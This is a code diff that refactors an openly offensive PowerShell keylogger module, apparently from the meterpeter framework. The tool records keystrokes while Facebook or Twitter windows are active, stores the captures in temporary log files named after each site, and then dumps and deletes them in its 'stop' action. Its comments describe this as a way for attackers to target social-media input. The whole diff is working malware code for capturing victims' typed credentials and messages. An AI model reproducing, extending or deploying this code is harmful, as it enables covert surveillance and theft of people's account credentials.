@@ -168,6 +168,88 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 Keystrokes")
 
 
+function Invoke-KillAllPids ()
+{
+   <#
+   .SYNOPSIS
+      Author: @r00t-3xp10it
+      Helper - Kill all key`logger PID's running.
+   #>
+
+   $PPID = (Get-Content "$Env:TMP\pid.log" -EA SilentlyContinue|Where-Object { $_ -ne '' })
+
+   ## Kill Process PID(s)
+   ForEach($KProcessId in $PPID)
+   {
+      ## Check if process ID its running before try to stop it.
+      If([bool](Get-Process -Id "$KProcessId" -EA SilentlyContinue) -Match 'True')
+      {
+         ## Stop key`logger process by is PPID
+         write-host "   ╰➤ " -ForegroundColor Green -NoNewline
+         write-host "Stoping key`logger PID: " -NoNewline
+         write-host "$KProcessId" -ForegroundColor Green
+         Stop-Process -Id $KProcessId -Force
+      }
+   }
+}
+
+function Invoke-CheckMediaForChange ()
+{
+   <#
+   .SYNOPSIS
+      Author: @r00t-3xp10it
+      Helper - Detect [facebook<->twitter] active tab changes.
+   #>
+
+   If(Test-Path -Path "$Env:TMP\Smeagol.log")
+   {
+      If($StartKeys -imatch 'Facebook'){$SocialSite = "Facebook"}
+      If($StartKeys -imatch '/ X |twitter.com'){$SocialSite = "Twitter"}
+      $LastAccessed = (Get-Content -Path "$Env:TMP\Smeagol.log" -EA SilentlyContinue)
+
+      If(-not($LastAccessed -match "^($SocialSite)$"))
+      {
+         write-host "   ╰➤ " -ForegroundColor Green -NoNewline
+         write-host "move detected from " -ForegroundColor Red -NoNewline
+         write-host "$LastAccessed" -ForegroundColor Green -NoNewline
+         write-host " to " -ForegroundColor Red -NoNewline
+         write-host "$SocialSite" -ForegroundColor Green
+
+         ## Stop key`logger PID(s)
+         If(Test-Path -Path "$Env:TMP\pid.log")
+         {
+            ## Kill all PID's
+            Invoke-KillAllPids
+
+            ## CleanUp -- Rename
+            If(Test-Path -Path "$Env:TMP\void.log")
+            {
+               [int]$Counter = [int]$Counter+1
+               ## Random FileName generation - rename logfile [name+extension]
+               # This allows attackers to stop key`logger if target its not on social media
+               $Rand = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 6 |%{[char]$_})
+                     
+               $Name = "$Counter"+"_"+"$Rand" -join '' ## Add $Counter to beggining of Name to order creation
+               Move-Item -Path "$Env:TMP\void.log" -Destination "$Env:TMP\${Name}.${LastAccessed}" -Force
+
+               ## Print info onscreen
+               write-host "   ╰➤ " -ForegroundColor Green -NoNewline
+               write-host "logfile: " -NoNewline
+               write-host "void.log" -ForegroundColor Yellow -NoNewline
+               write-host " renamed to: " -NoNewline
+               write-host "${Name}.${LastAccessed}" -ForegroundColor Yellow
+
+               ## CleanUP
+               Remove-Item -Path "$Env:TMP\pid.log" -Force
+               Remove-Item -Path "$Env:TMP\Smeagol.log" -Force
+               #Remove-Item -Path "$Env:TMP\AUTO_BACKUP.${SocialSite}" -Force
+            }
+         }
+      }
+   }
+}
+
+
 If($Action -iMatch '^(start)$')
 {
    [int]$Counter = 0
@@ -204,7 +286,7 @@ If($Action -iMatch '^(start)$')
 
 
    echo ""
-   ## To stop previous process (loop) meterpeter requires this PID
+   ## :meterpeter> requires this PID
    $pid > "$Env:TMP\met.pid"
    
    
@@ -227,70 +309,8 @@ If($Action -iMatch '^(start)$')
             $StartKeys = (Get-Process -Name "$Item").MainWindowTitle|Where-Object{$_ -NotMatch '^(0)$'}|Where-Object{$_ -ne ''}
             If(($StartKeys -iMatch 'Facebook') -or ($StartKeys -iMatch '/ X |Twitter.com'))
             {
-
-               ## Smeagol -- Detect social media change
-               If(Test-Path -Path "$Env:TMP\Smeagol.log")
-               {
-                  If($StartKeys -imatch 'Facebook'){$SocialSite = "Facebook"}
-                  If($StartKeys -imatch '/ X |twitter.com'){$SocialSite = "Twitter"}
-                  $Aristoteles = (Get-Content -Path "$Env:TMP\Smeagol.log" -EA SilentlyContinue)
-
-                  If(-not($Aristoteles -match "^($SocialSite)$"))
-                  {
-                     write-host "   ╰➤ " -ForegroundColor Green -NoNewline
-                     write-host "move detected from " -ForegroundColor Red -NoNewline
-                     write-host "$Aristoteles" -ForegroundColor Green -NoNewline
-                     write-host " to " -ForegroundColor Red -NoNewline
-                     write-host "$SocialSite" -ForegroundColor Green
-
-                     ## Stop key`logger PID(s)
-                     If(Test-Path -Path "$Env:TMP\pid.log")
-                     {
-                        ## Get key`logger PPID(s) from logfile
-                        $PPID = (Get-Content "$Env:TMP\pid.log" -EA SilentlyContinue|Where-Object { $_ -ne '' })
-
-                        ## Kill Process PID(s)
-                        ForEach($NewThing in $PPID)
-                        {
-                           ## Check if process ID its running before try to stop it.
-                           If([bool](Get-Process -Id "$NewThing" -EA SilentlyContinue) -Match 'True')
-                           {
-                              ## Stop key`logger process by is PPID
-                              write-host "   ╰➤ " -ForegroundColor Green -NoNewline
-                              write-host "Stoping key`logger PID: " -NoNewline
-                              write-host "$NewThing" -ForegroundColor Green
-                              Stop-Process -Id $NewThing -Force
-                           }
-                        }
-
-                        ## CleanUp -- Rename
-                        If(Test-Path -Path "$Env:TMP\void.log")
-                        {
-                           [int]$Counter = [int]$Counter+1
-                           ## Random FileName generation - rename logfile [name+extension]
-                           # This allows attackers to stop key`logger if target its not on social media
-                           $Rand = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 6 |%{[char]$_})
-                     
-                           $Name = "$Counter"+"_"+"$Rand" -join '' ## Add $Counter to beggining of Name to order creation
-                           Move-Item -Path "$Env:TMP\void.log" -Destination "$Env:TMP\${Name}.${Aristoteles}" -Force
-
-                           ## Print info onscreen
-                           write-host "   ╰➤ " -ForegroundColor Green -NoNewline
-                           write-host "logfile: " -NoNewline
-                           write-host "void.log" -ForegroundColor Yellow -NoNewline
-                           write-host " renamed to: " -NoNewline
-                           write-host "${Name}.${Aristoteles}" -ForegroundColor Yellow
-
-                           ## CleanUP
-                           Remove-Item -Path "$Env:TMP\pid.log" -Force
-                           Remove-Item -Path "$Env:TMP\Smeagol.log" -Force
-                           Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Twitter" -Force
-                           Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Facebook" -Force
-                        }
-                     }
-                  }
-               }## Smeagol function
-
+               ## Detect social media changes
+               Invoke-CheckMediaForChange
 
                ## Store last access social media
                If($StartKeys -imatch 'Facebook')
@@ -303,7 +323,6 @@ If($Action -iMatch '^(start)$')
                   $SocialSite = "Twitter"
                   echo "$SocialSite" > $Env:TMP\Smeagol.log
                }
-
 
                ## If pid.log does not exist = Start process
                If(-not(Test-Path -Path "$Env:TMP\pid.log"))
@@ -329,22 +348,8 @@ If($Action -iMatch '^(start)$')
                write-host "   > Error: none social media found active!" -ForegroundColor Red
                If(Test-Path -Path "$Env:TMP\pid.log")
                {
-                  ## Get key`logger PPID(s) from logfile
-                  $PPID = (Get-Content "$Env:TMP\pid.log" -EA SilentlyContinue|Where-Object { $_ -ne '' })
-
-                  ## Kill Process PID(s)
-                  ForEach($Thing in $PPID)
-                  {
-                     ## Check if process ID its running before try to stop it.
-                     If([bool](Get-Process -Id "$Thing" -EA SilentlyContinue) -Match 'True')
-                     {
-                        ## Stop key`logger process by is PPID
-                        write-host "   ╰➤ " -ForegroundColor Green -NoNewline
-                        write-host "Stoping key`logger PID: " -NoNewline
-                        write-host "$Thing" -ForegroundColor Green
-                        Stop-Process -Id $Thing -Force
-                     }
-                  }
+                  ## Kill all PID's
+                  Invoke-KillAllPids
 
                   If(Test-Path -Path "$Env:TMP\void.log")
                   {
@@ -384,19 +389,8 @@ If($Action -iMatch '^(stop)$')
       Helper - Stop key`logger process (PID) and leak captures
    #>
 
-   ## Get key`logger PPID from logfile
-   $PPID = (Get-Content "$Env:TMP\pid.log" -EA SilentlyContinue|Where-Object { $_ -ne '' })
-
-   ## Kill Process PID(s)
-   ForEach($Proc in $PPID)
-   {
-      ## Check if process ID its running before try to stop it.
-      If([bool](Get-Process -Id "$Proc" -EA SilentlyContinue) -Match 'True')
-      {
-         ## Stop key-logger process by is PPID
-         Stop-Process -Id $Proc -Force
-      }
-   }
+   ## Kill all PID's
+   Invoke-KillAllPids
 
    $GetLogNames = (dir $Env:TMP).Name|findstr /C:'.Facebook' /C:'.Twitter' /C:'AUTO_BACKUP.'
    If(-not([string]::IsNullOrEmpty($GetLogNames)))
@@ -423,7 +417,7 @@ If($Action -iMatch '^(stop)$')
          }
       }
 
-      ForEach($Report in $GetLogNames)
+      ForEach($ReportFile in $GetLogNames)
       {
          <#
          .SYNOPSIS
@@ -432,12 +426,12 @@ If($Action -iMatch '^(stop)$')
          #>      
       
          ## Get social media names from extension
-         $SocialSite = ($Report).split('.')[1]
+         $SocialSite = ($ReportFile).split('.')[1]
          write-host "`nSocial Media: $SocialSite"      
-         write-host "Logfile: $Report"
+         write-host "Logfile: $ReportFile"
          write-host "----------------------------"
-         Get-Content -Path "$Env:TMP\${Report}" -EA SilentlyContinue
-         Remove-Item -Path "$Env:TMP\${Report}" -Force
+         Get-Content -Path "$Env:TMP\${ReportFile}" -EA SilentlyContinue
+         Remove-Item -Path "$Env:TMP\${ReportFile}" -Force
          write-host "----------------------------`n"   
       }
 
